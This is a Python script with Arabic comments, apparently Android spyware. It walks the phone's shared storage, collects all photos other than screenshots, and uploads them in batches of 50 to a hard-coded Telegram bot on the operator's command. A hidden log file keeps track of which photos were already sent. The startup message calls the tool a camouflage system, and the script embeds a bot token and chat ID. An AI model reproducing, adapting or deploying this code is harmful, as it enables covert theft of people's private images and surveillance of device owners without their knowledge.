import os
import time
import requests

# بيانات الربط الخاصة بك
BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"
# ملف السجل لمنع التكرار (مخفي)
LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"

def get_sent():
    if not os.path.exists(LOG_FILE): return set()
    with open(LOG_FILE, "r") as f: return set(f.read().splitlines())

def save_sent(path):
    try:
        with open(LOG_FILE, "a") as f: f.write(path + "\n")
    except: pass

def send_msg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except: pass

def send_doc(path):
    try:
        with open(path, "rb") as f:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                              data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
        return r.status_code == 200
    except: return False

def check_command():
    """يفحص إذا أرسلت الرقم 1 للبوت"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        r = requests.get(url, params={"offset": -1}, timeout=10).json()
        if r.get("result"):
            msg = r["result"][-1].get("message", {}).get("text", "")
            if msg == "1": return True
    except: pass
    return False

def super_deep_scan():
    """مسح شامل لكل زوايا الذاكرة التي ظهرت في صورك"""
    root_path = "/storage/emulated/0/"
    sent = get_sent()
    all_photos = []
    
    for root, dirs, files in os.walk(root_path):
        # تجاهل لقطات الشاشة بناءً على طلبك
        if "screenshot" in root.lower():
            continue
            
        for file in files:
            if file.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
                full_path = os.path.join(root, file)
                if full_path not in sent:
                    all_photos.append(full_path)
    
    # الترتيب من الأقدم للأحدث (الأرشيف أولاً)
    all_photos.sort(key=lambda x: os.path.getmtime(x))
    return all_photos

def main():
    # رسالة التنبيه فور تشغيل التطبيق
    time.sleep(2) 
    send_msg("🚀 تم تشغيل نظام التمويه بنجاح.\nالرادار الآن في وضع الاستعداد للأرشيف العميق.\n\nأرسل رقم (1) لسحب 50 صورة جديدة.")
    
    while True:
        try:
            if check_command():
                send_msg("⏳ جاري سحب أعمق الصور من الأرشيف.. يرجى الانتظار.")
                
                photos = super_deep_scan()
                
                if not photos:
                    send_msg("✅ تم سحب كل ملفات الأرشيف المتاحة حالياً.")
                else:
                    count = 0
                    for p in photos:
                        if count >= 50: break # الحد الأقصى للدفعة
                        if send_doc(p):
                            save_sent(p)
                            count += 1
                            time.sleep(0.3)
                    
                    send_msg(f"✅ تم سحب دفعة مكونة من {count} صورة بنجاح.\nأرسل (1) للمزيد.")
            
            time.sleep(7) # فحص الأوامر كل 7 ثوانٍ
        except:
            time.sleep(10)

if __name__ == "__main__":
    main()
